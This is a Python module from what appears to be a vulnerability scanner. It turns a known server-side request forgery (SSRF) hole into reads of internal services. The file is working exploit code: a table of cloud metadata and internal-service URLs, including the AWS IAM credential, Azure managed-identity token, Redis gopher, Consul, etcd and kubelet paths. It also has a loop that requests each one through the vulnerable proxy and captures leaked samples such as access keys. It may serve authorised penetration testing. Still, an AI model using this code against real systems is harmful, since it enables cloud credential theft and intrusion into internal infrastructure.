"""
CyberScope v7.8 · SSRF Deep Exploitation Engine.

Escalates an SSRF surface into a real cloud-metadata / internal-service
compromise **without ever writing anything** — we only READ.

Providers covered:
  * AWS EC2 (IMDSv1 + IMDSv2)
  * GCP metadata server
  * Azure IMDS
  * DigitalOcean metadata
  * Alibaba Cloud
  * Redis / Memcached via gopher://
  * Consul / etcd internal APIs

We deliberately require an existing SSRF surface (a proven URL that
fetches arbitrary hosts) as input.  We do not attempt to *find* SSRF
here (the main injection scanners already do that).

Every request goes through the SSRF-inducing endpoint provided by the
caller, so from CyberScope's perspective it's a normal HTTP GET to the
target — the *target* is the vulnerable proxy.
"""
from __future__ import annotations

from typing import Any, Dict, List


CLOUD_ENDPOINTS = {
    'aws_imdsv1': 'http://169.254.169.254/latest/meta-data/',
    'aws_imdsv1_iam': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'aws_imdsv2_token': 'http://169.254.169.254/latest/api/token',
    'gcp_metadata': 'http://metadata.google.internal/computeMetadata/v1/',
    'gcp_service_accounts': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
    'azure_imds': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'azure_managed_identity': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01',
    'do_metadata': 'http://169.254.169.254/metadata/v1/',
    'alibaba_metadata': 'http://100.100.100.200/latest/meta-data/',
    'redis_info': 'gopher://127.0.0.1:6379/_INFO',
    'consul_kv': 'http://127.0.0.1:8500/v1/kv/?recurse',
    'etcd_v2': 'http://127.0.0.1:2379/v2/keys/?recursive=true',
    'kubelet_pods': 'https://127.0.0.1:10250/pods',
}


SIGNATURES = {
    'aws_imdsv1':      ['ami-id', 'instance-id', 'iam/'],
    'aws_imdsv1_iam':  ['AccessKeyId', 'SecretAccessKey', 'Token'],
    'gcp_metadata':    ['instance/', 'project/'],
    'azure_imds':      ['compute', 'osType', 'subscriptionId'],
    'redis_info':      ['redis_version', 'os:Linux', 'connected_clients'],
    'consul_kv':       ['CreateIndex', 'ModifyIndex', 'LockIndex'],
    'etcd_v2':         ['createdIndex', 'action', 'nodes'],
}


async def exploit_via_ssrf(client, ssrf_url_template: str, log_cb=None) -> Dict[str, Any]:
    """
    Try every cloud-metadata endpoint through the provided SSRF template.
    `ssrf_url_template` MUST contain `{PAYLOAD}` where the internal URL is
    substituted.  Example: `https://vuln.tld/fetch?url={PAYLOAD}`.

    Returns {matches: [...], total_tried: N}.
    """
    def _log(m):
        if log_cb:
            try:
                log_cb(m)
            except Exception:
                pass

    if '{PAYLOAD}' not in ssrf_url_template:
        return {'error': 'ssrf_url_template must contain {PAYLOAD}', 'matches': []}

    matches: List[Dict[str, Any]] = []

    for name, internal_url in CLOUD_ENDPOINTS.items():
        crafted = ssrf_url_template.replace('{PAYLOAD}', internal_url)
        try:
            # IMDSv2 needs a token header  (best-effort — many SSRFs
            # don't allow header manipulation, that's OK).
            r = await client.get(crafted, headers={
                'Metadata-Flavor': 'Google',    # GCP
                'Metadata': 'true',              # Azure
                'X-aws-ec2-metadata-token-ttl-seconds': '21600',  # AWS IMDSv2
            })
        except Exception as e:
            _log(f'[ssrf-deep] {name}: {type(e).__name__}: {e}')
            continue

        body = (r.text or '')
        sigs = SIGNATURES.get(name, [])
        hit = any(s in body for s in sigs) if sigs else False

        if hit:
            matches.append({
                'type': 'ssrf_deep',
                'subtype': name,
                'url': crafted,
                'severity': 'critical',
                'cvss': 9.8,
                'evidence': f'SSRF pivots to internal {name} — signature bytes leaked (len={len(body)}).',
                'confidence': 95,
                'verified': True,
                'sample': body[:300],
            })
            _log(f'[!] SSRF-deep pivot: {name} @ {crafted}')

    return {'matches': matches, 'total_tried': len(CLOUD_ENDPOINTS)}
